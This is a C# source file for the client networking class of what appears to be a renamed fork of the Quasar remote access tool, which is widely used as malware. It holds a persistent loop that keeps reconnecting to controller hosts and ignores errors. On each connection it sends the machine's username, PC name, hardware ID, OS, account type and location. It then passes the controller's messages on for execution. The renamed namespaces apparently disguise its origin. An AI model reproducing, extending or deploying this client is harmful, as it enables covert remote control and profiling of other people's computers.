using Ton618.User;
using Q3C273.Shared.DNS;
using Q3C273.Shared.Helpers;
using Q3C273.Shared.Messages;
using Q3C273.Shared.Utilities;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Ton618.Config;
using Ton618.Helper;
using Ton618.IO;
using Ton618.IpGeoLocation;
using Q3C273.Shared.Messages.Client;
using System.Linq;

namespace Ton618.Networking
{
    public class QuasarClient : Client, IDisposable
    {
        /// <summary>
        /// Used to keep track if the client has been identified by the server.
        /// </summary>
        private bool _identified;

        /// <summary>
        /// The hosts manager which contains the available hosts to connect to.
        /// </summary>
        private readonly HostsManager _hosts;

        /// <summary>
        /// Random number generator to slightly randomize the reconnection delay.
        /// </summary>
        private readonly SafeRandom _random;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

        /// <summary>
        /// Initializes a new instance of the <see cref="QuasarClient"/> class.
        /// </summary>
        /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
        /// <param name="serverCertificate">The server certificate.</param>
        public QuasarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            _hosts = hostsManager;
            _random = new SafeRandom();
            ClientState += OnClientState;
            ClientRead += OnClientRead;
            ClientFail += OnClientFail;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        /// <summary>
        /// Connection loop used to reconnect and keep the connection open.
        /// </summary>
        public void ConnectLoop()
        {
            // TODO: do not re-use object
            while (!_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    try
                    {
                        var host = _hosts.GetNextHost();

                        Connect(host.IpAddress, host.Port);
                    }
                    catch { } // Try indefinitely even if exception occurs
                }

                while (Connected) // hold client open
                {
                    try
                    {
                        _token.WaitHandle.WaitOne(1000);
                    }
                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                    {
                        Disconnect();
                        return;
                    }
                }

                if (_token.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
            }
        }

        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!_identified)
            {
                if (message.GetType() == typeof(ClientIdentificationResult))
                {
                    var reply = (ClientIdentificationResult)message;
                    _identified = reply.Result;
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            _identified = false; // always reset identification

            if (connected)
            {
                // send client identification once connected

                var geoInfo = GeoInformationFactory.GetGeoInformation();
                var userAccount = new UserAccount();

                client.Send(new ClientIdentification
                {
                    Version = Settings.VERSION,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = userAccount.Type.ToString(),
                    Country = geoInfo.Country,
                    CountryCode = geoInfo.CountryCode,
                    ImageIndex = geoInfo.ImageIndex,
                    Id = HardwareDevices.HardwareId,
                    Username = userAccount.UserName,
                    PcName = SystemHelper.GetPcName(),
                    Tag = Settings.TAG,
                    EncryptionKey = Settings.ENCRYPTIONKEY,
                    Signature = Qase64.Decode(Settings.SERVERSIGNATURE)
                });
            }
        }

        /// <summary>
        /// Stops the connection loop and disconnects the connection.
        /// </summary>
        public void Exit()
        {
            _tokenSource.Cancel();
            Disconnect();
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this activity detection service.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}
